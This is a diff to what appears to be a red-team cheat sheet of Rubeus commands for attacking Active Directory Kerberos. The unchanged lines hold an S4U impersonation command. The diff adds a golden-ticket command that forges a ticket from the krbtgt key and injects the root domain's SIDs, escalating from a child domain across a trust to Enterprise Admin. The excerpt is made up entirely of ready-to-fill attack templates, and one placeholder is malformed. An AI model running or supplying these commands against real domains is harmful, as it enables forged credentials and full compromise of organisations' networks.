@@ -251,10 +251,10 @@ DB admin: MSSQLSvc
 .\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /altservice:<service_comma_sep> /domain:<domain> /ptt
 ```
 
-## golden - to do
+## golden - child-parent trust SIDHistory injection 
 #cat/ATTACK/EXPLOIT 
 ```
-.\Rubeus.exe golden XXXXXXXXXXXXXXXX
+.\Rubeus.exe golden /user:<username> /id:<user RID> /domain:<child_domain_FQDN> /sid:child_somain_sid> /groups:<RIDs|513> /sids:<root_domain_sid>-<rid|519> /aes256:<krbtgt_aes_key> /ptt
 ```
 
 ## silver - to do
